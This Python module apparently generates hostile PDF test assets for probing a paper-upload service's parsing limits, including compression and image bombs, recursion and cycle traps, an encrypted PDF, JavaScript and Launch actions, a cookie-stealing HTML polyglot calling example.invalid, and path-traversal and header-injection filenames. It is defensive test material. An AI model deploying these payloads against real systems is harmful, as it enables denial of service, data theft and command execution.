"""Hostile PDF resource assets for attack category 8 (standard library only, deterministic).

Each asset targets one resource or trust boundary of paper admission and parsing. Assets are generated on demand
into a directory and never committed: some are compression bombs. The expectations describe what a safe
application does through its normal interfaces, and the tests compare those against what it actually does.

    python3.11 -c "from drbean_eval import hostile_pdfs; print(hostile_pdfs.generate('/tmp/x'))"

Product limits these assets probe (sprint proposal): one retained paper, 20 MiB, 50 pages, at most 8 selected pages
per model batch, bounded rendering and text extraction, paper bytes never executable instructions.
"""
from __future__ import annotations

import hashlib
import json
import os
import struct
import zlib

from . import pdfwrite

MiB = 1024 * 1024
PAD = bytes.fromhex("28BF4E5E4E758A4164004E56FFFA01082E2E00B6D0683E802F0CA9FE6453697A")

# expected: reject_before_parse | reject_safely | bounded | page_cap | no_active_content | not_a_pdf
ASSETS = {
    "truncated": ("reject_safely", "valid header, file cut before xref and trailer"),
    "garbage-xref": ("reject_safely", "startxref points past the end; xref is noise"),
    "password-protected": ("reject_safely", "standard security handler (RC4 40-bit) with a user password; text "
                                            "cannot be read without it and must not be guessed"),
    "pages-51": ("page_cap", "51 pages, one more than the 50-page admission cap"),
    "pages-2000": ("page_cap", "2000 tiny pages in a small file; the cap must apply before per-page work"),
    "oversize-21mib": ("reject_before_parse", "21 MiB file (above the 20 MiB cap) padded with an unreferenced "
                                              "stream"),
    "inflate-bomb": ("bounded", "one content stream that inflates from about 128 KiB to 128 MiB"),
    "image-dimension-bomb": ("bounded", "image XObject declaring 60000 x 60000 RGB pixels with a tiny stream"),
    "image-inflate-bomb": ("bounded", "12000 x 12000 grayscale image (144 MB raw) compressed to well under 1 MiB"),
    "nested-arrays": ("bounded", "an object nested 50000 arrays deep (parser recursion)"),
    "page-tree-cycle": ("reject_safely", "the page tree lists its own Pages node as a kid (infinite walk)"),
    "huge-xref-size": ("reject_safely", "trailer /Size 2147483647 (allocation from a declared count)"),
    "javascript-openaction": ("no_active_content", "OpenAction and page AA JavaScript; must never run or be "
                                                   "surfaced as an instruction"),
    "launch-and-uri-actions": ("no_active_content", "Launch action naming an executable and a URI action to an "
                                                    "external host; never followed"),
    "embedded-attachment": ("no_active_content", "an EmbeddedFiles attachment holding a script; never extracted, "
                                                 "executed or analysed as paper content"),
    "html-polyglot": ("not_a_pdf", "HTML with a script, PDF header only after 600 bytes"),
    "png-bytes-named-pdf": ("not_a_pdf", "a real PNG uploaded as application/pdf"),
    "header-only": ("reject_safely", "the 9-byte header %PDF-1.4 and nothing else"),
    "empty": ("reject_before_parse", "zero bytes"),
}
# Upload names for routes that take a filename (the current image route takes none).
HOSTILE_FILENAMES = ["../../../../etc/passwd.pdf", "..\\..\\..\\windows\\win.ini.pdf", "paper\x00.pdf.exe",
                     "a" * 300 + ".pdf", "‮fdp.exe", "CON.pdf", ".hidden.pdf", "paper.pdf/../../escape.pdf",
                     "%2e%2e%2fescape.pdf", "paper\r\nX-Injected: 1.pdf"]


def _simple(title: str, pages: int = 1, text: str = "Synthetic hostile-resource probe page.") -> pdfwrite.Document:
    doc = pdfwrite.Document(title)
    for number in range(pages):
        page = doc.page()
        page.text(72, 720, f"{text} Page {number + 1} of {pages}.", size=10)
    return doc


def _rc4(key: bytes, data: bytes) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    out, i, j = bytearray(), 0, 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        out.append(byte ^ s[(s[i] + s[j]) % 256])
    return bytes(out)


def _padded(password: bytes) -> bytes:
    return (password + PAD)[:32]


def encrypted_pdf(user_password: bytes = b"drbean-user", owner_password: bytes = b"drbean-owner") -> tuple[bytes, dict]:
    """A one-page PDF under the standard security handler (V1, R2, 40-bit RC4). Returns (bytes, key material)."""
    file_id = hashlib.md5(b"drbean-hostile-encrypted").digest()
    owner_key = hashlib.md5(_padded(owner_password)).digest()[:5]
    o_entry = _rc4(owner_key, _padded(user_password))
    permissions = -44  # printing and copying denied
    key = hashlib.md5(_padded(user_password) + o_entry + struct.pack("<i", permissions) + file_id).digest()[:5]
    u_entry = _rc4(key, PAD)

    def object_key(number: int) -> bytes:
        return hashlib.md5(key + struct.pack("<I", number)[:3] + b"\x00\x00").digest()[:10]

    content = b"BT /F1 12 Tf 72 720 Td (Encrypted synthetic paper: concentration 4.62 mg/L at 0.5 h.) Tj ET"
    secret = _rc4(object_key(4), content)
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 5 0 R >> >> "
        b"/Contents 4 0 R >>",
        b"<< /Length %d >>\nstream\n%s\nendstream" % (len(secret), secret),
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
        b"<< /Filter /Standard /V 1 /R 2 /O <%s> /U <%s> /P %d >>" % (o_entry.hex().encode(), u_entry.hex().encode(),
                                                                     permissions),
    ]
    out = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets = []
    for number, body in enumerate(objects, 1):
        offsets.append(len(out))
        out += b"%d 0 obj\n%s\nendobj\n" % (number, body)
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1)
    out += b"".join(b"%010d 00000 n \n" % offset for offset in offsets)
    out += b"trailer\n<< /Size %d /Root 1 0 R /Encrypt 6 0 R /ID [<%s> <%s>] >>\nstartxref\n%d\n%%%%EOF\n" % (
        len(objects) + 1, file_id.hex().encode(), file_id.hex().encode(), xref)
    return bytes(out), {"key": key, "object_key": object_key(4), "plaintext": content, "ciphertext": secret}


def _compressed_zeros(total: int, fill: bytes = b" ") -> bytes:
    compressor = zlib.compressobj(9)
    chunk = fill * MiB
    parts, remaining = [], total
    while remaining > 0:
        size = min(remaining, len(chunk))
        parts.append(compressor.compress(chunk[:size]))
        remaining -= size
    parts.append(compressor.flush())
    return b"".join(parts)


def _raw_pdf(objects: list[bytes], root: int, trailer_extra: bytes = b"", size: int | None = None) -> bytes:
    out = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets = []
    for number, body in enumerate(objects, 1):
        offsets.append(len(out))
        out += b"%d 0 obj\n%s\nendobj\n" % (number, body)
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1)
    out += b"".join(b"%010d 00000 n \n" % offset for offset in offsets)
    out += b"trailer\n<< /Size %d /Root %d 0 R%s >>\nstartxref\n%d\n%%%%EOF\n" % (
        size if size is not None else len(objects) + 1, root, trailer_extra, xref)
    return bytes(out)


def _font_page(contents: int, extra_resources: bytes = b"", extra: bytes = b"") -> bytes:
    return (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >>%s >> "
            b"/Contents %d 0 R%s >>" % (extra_resources, contents, extra))


def _stream(data: bytes, dictionary: bytes = b"", *, compressed: bytes | None = None) -> bytes:
    if compressed is not None:
        return b"<< %s /Filter /FlateDecode /Length %d >>\nstream\n%s\nendstream" % (dictionary, len(compressed),
                                                                                    compressed)
    return b"<< %s /Length %d >>\nstream\n%s\nendstream" % (dictionary, len(data), data)


FONT = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>"
TEXT = b"BT /F1 12 Tf 72 720 Td (Synthetic hostile-resource probe.) Tj ET"


def build(name: str) -> bytes:
    if name == "truncated":
        data = _simple("Truncated probe", pages=3).to_bytes()
        return data[: int(len(data) * 0.6)]
    if name == "garbage-xref":
        body = _simple("Garbage xref probe").to_bytes()
        cut = body.rfind(b"xref")
        return body[:cut] + b"xref\n0 9\nnot an xref table at all\ntrailer\n<< /Size 9 >>\nstartxref\n999999999\n%%EOF\n"
    if name == "password-protected":
        return encrypted_pdf()[0]
    if name == "pages-51":
        return _simple("Fifty-one pages", pages=51).to_bytes()
    if name == "pages-2000":
        return _simple("Two thousand pages", pages=2000, text="p").to_bytes()
    if name == "oversize-21mib":
        doc = _simple("Oversize probe")
        doc.add_object(b"<< /Length %d >>\nstream\n%s\nendstream" % (21 * MiB, b"0" * (21 * MiB)))
        return doc.to_bytes()
    if name == "inflate-bomb":
        bomb = _compressed_zeros(128 * MiB)
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT,
                         _font_page(5), _stream(b"", compressed=bomb)], root=1)
    if name == "image-dimension-bomb":
        tiny = zlib.compress(b"\x00" * 64, 9)
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT,
                         _font_page(5, b" /XObject << /Im1 6 0 R >>"),
                         _stream(TEXT + b"\nq 400 0 0 400 100 200 cm /Im1 Do Q"),
                         _stream(b"", b"/Type /XObject /Subtype /Image /Width 60000 /Height 60000 "
                                      b"/ColorSpace /DeviceRGB /BitsPerComponent 8", compressed=tiny)], root=1)
    if name == "image-inflate-bomb":
        pixels = _compressed_zeros(12000 * 12000, fill=b"\x80")
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT,
                         _font_page(5, b" /XObject << /Im1 6 0 R >>"),
                         _stream(TEXT + b"\nq 400 0 0 400 100 200 cm /Im1 Do Q"),
                         _stream(b"", b"/Type /XObject /Subtype /Image /Width 12000 /Height 12000 "
                                      b"/ColorSpace /DeviceGray /BitsPerComponent 8", compressed=pixels)], root=1)
    if name == "nested-arrays":
        depth = 50000
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R /Deep 6 0 R >>",
                         b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT, _font_page(5), _stream(TEXT),
                         b"[" * depth + b"]" * depth], root=1)
    if name == "page-tree-cycle":
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R >>",
                         b"<< /Type /Pages /Kids [2 0 R 4 0 R] /Count 2 >>", FONT, _font_page(5), _stream(TEXT)], root=1)
    if name == "huge-xref-size":
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT,
                         _font_page(5), _stream(TEXT)], root=1, size=2147483647)
    if name == "javascript-openaction":
        script = b"app.alert('This script must never run.'); this.submitForm('https://example.invalid/steal');"
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R /Names << /JavaScript << /Names "
                         b"[(drbean) 6 0 R] >> >> >>",
                         b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT,
                         _font_page(5, extra=b" /AA << /O 6 0 R >>"), _stream(TEXT),
                         b"<< /S /JavaScript /JS (%s) >>" % script], root=1)
    if name == "launch-and-uri-actions":
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R >>",
                         b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT,
                         _font_page(5, extra=b" /Annots [7 0 R]"), _stream(TEXT),
                         b"<< /S /Launch /F (/bin/sh) /Win << /F (cmd.exe) /P (/c calc) >> /NewWindow true >>",
                         b"<< /Type /Annot /Subtype /Link /Rect [72 700 300 730] /A << /S /URI "
                         b"/URI (https://example.invalid/collect?paper=1) >> >>"], root=1)
    if name == "embedded-attachment":
        payload = b"print('this attachment must never be executed or read as paper content')\n"
        return _raw_pdf([b"<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles << /Names [(payload.py) 6 0 R] "
                         b">> >> >>", b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>", FONT, _font_page(5),
                         _stream(TEXT), b"<< /Type /Filespec /F (payload.py) /UF (payload.py) /EF << /F 7 0 R >> >>",
                         _stream(payload, b"/Type /EmbeddedFile /Subtype /text#2Fx-python")], root=1)
    if name == "html-polyglot":
        html = (b"<!doctype html><html><head><script>fetch('https://example.invalid/'+document.cookie)</script>"
                b"</head><body>" + b"<!-- padding -->" * 32 + b"</body></html>\n")
        return html + _simple("Polyglot probe").to_bytes()
    if name == "png-bytes-named-pdf":
        def chunk(kind, data):
            return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF)
        raw = b"".join(b"\x00" + b"\xff" * 8 for _ in range(8))
        return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 8, 8, 8, 0, 0, 0, 0))
                + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b""))
    if name == "header-only":
        return b"%PDF-1.4\n"
    if name == "empty":
        return b""
    raise KeyError(name)


def generate(directory: str, names: list[str] | None = None) -> dict:
    """Write the assets (``<name>.pdf``) and ``assets.json`` (expectation, description, size, digest)."""
    os.makedirs(directory, exist_ok=True)
    index = {}
    for name in names or list(ASSETS):
        data = build(name)
        path = os.path.join(directory, f"{name}.pdf")
        with open(path, "wb") as handle:
            handle.write(data)
        expected, description = ASSETS[name]
        index[name] = {"file": os.path.basename(path), "bytes": len(data),
                       "sha256": hashlib.sha256(data).hexdigest(), "expected": expected, "description": description}
    with open(os.path.join(directory, "assets.json"), "w", encoding="utf-8") as handle:
        json.dump({"assets": index, "hostile_filenames": HOSTILE_FILENAMES}, handle, indent=1, sort_keys=True)
    return index
